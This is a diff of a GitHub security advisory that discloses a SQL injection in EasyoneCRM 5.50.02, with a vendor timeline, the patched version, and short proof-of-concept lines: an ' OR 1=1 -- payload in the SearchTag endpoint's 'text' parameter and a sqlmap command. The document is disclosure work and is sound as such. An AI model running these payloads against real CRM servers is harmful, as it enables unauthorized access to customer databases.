@@ -1,16 +1,47 @@
-# EasyoneCRM-5.50.02-RCE
-Easyone One is an Italian CRM company bla bla
-Easyone One è una CRM company italiana che in 14 anni di esperienza si è focalizzata su una mission: organizzare i processi di vendita delle aziende, in un mercato sempre più complesso e competitivo, attraverso la digitalizzazione dei processi  a partire dall’attività più importante e strategica: la relazione con il cliente.
+# EasyoneCRM-5.50.02-SQLinjection
+Easyone One is an Italian CRM company with 14 years of experience with a mission: to organize the sales processes of companies, in an increasingly complex and competitive market, through the digitization of processes from the most important and strategic activity: the relationship with the customer.
+Easyone is not a CRM vendor, it produce and develop directly CRM for the Italian market.
 
-Siamo convinti che un’azienda prospera solo se mantiene e crea continuamente una relazione con il suo cliente.
+Easyone developed integration with the most popular management systems on the Italian market: Alyante and Team System Metodo; SageX3, Galileo by San Marco Informatica, Arca by Wolters Kluver, Business by NTS, MecSal by Passpartout and more.
 
-Easyone  non è un rivenditore di CRM ma produce e sviluppa direttamente per il mercato italiano.
+Easyone has more than 1500 active customers on the national territory.
 
-Abbiamo sviluppato integrazioni con i gestionali più diffusi del mercato italiano: Alyante e Metodo di Team System; SageX3, Galileo di San Marco Informatica, Arca di Wolters Kluver, Business di NTS, MecSal di Passpartout e altri ancora.
+Exploiting this vulnerability allows a remote attacker to obtain control of the database. RCE is not guaranteed, depends on the privileges and capabilities of the user running the dbms. 
 
-Vantiamo già più di 1500 clienti attivi sul territorio nazionale attraverso i nostri partners, vendors e software house, per alcune delle quali abbiamo sviluppato soluzioni brandizzate.
-
-Exploiting this vulnerability 
 Vulnerable version: 5.50.02
+Patched version: 5.50.02.03
 
-## PoC in progress
+# Timeline
+- 30/08/2022 - Contacted Easyone IT department via e-mail regarding the vulnerability
+- 05/09/2022 - Contacted Easyone IT department via telephone regarding availability slot to discuss the vulnerability
+- 19/09/2022 - Call with Easyone IT department - vulnerability explained and recognized by Easyone IT department
+- 19/09/2022 - CVE request approved by Easyone IT department
+- 19/09/2022 - Contacted Easyone IT department via e-mail with summary of the call - patching of the vulnerability planned 
+- 28/10/2022 - Contacted Easyone IT department asking about patching 
+- 28/10/2022 - Easyone IT department confirms the successful patching and the release of the patched version
+- 02/11/2022 - First CVE request sent  
+- 21/11/2022 - Reminder e-mail to cve.mitre.org
+- 29/11/2022 - Reminder e-mail to cve.mitre.org
+- 06/12/2022 - Reminder e-mail to cve.mitre.org
+- 14/12/2022 - cve.mitre.org asked about advisory
+- 15/12/2022 - CVE request with advisory provided to cve.mitre.org 
+
+
+## Execution
+- Vulnerable GET parameter: domain.com/Services/Misc.asmx/SearchTag?text=SQLI 
+- PoC: 
+```
+domain.com/Services/Misc.asmx/SearchTag?text=z' OR 1=1 --
+```
+- PoC via sqlmap: 
+```
+sqlmap -u https://domain.com/Services/Misc.asmx/SearchTag?text=a --dbms=DBMS --batch
+```
+
+## Screenshots
+![Immagine 2022-12-15 184659](https://user-images.githubusercontent.com/119488062/207931523-f5db2479-9bc2-429a-ab24-96ea6ee33919.png)
+
+## Automated PoC currently in development
+
+# Authors
+Luca Bernardi, Davide Bianchin, Fortunato [fox] Lodari @ Deda Cloud Cybersecurity Team
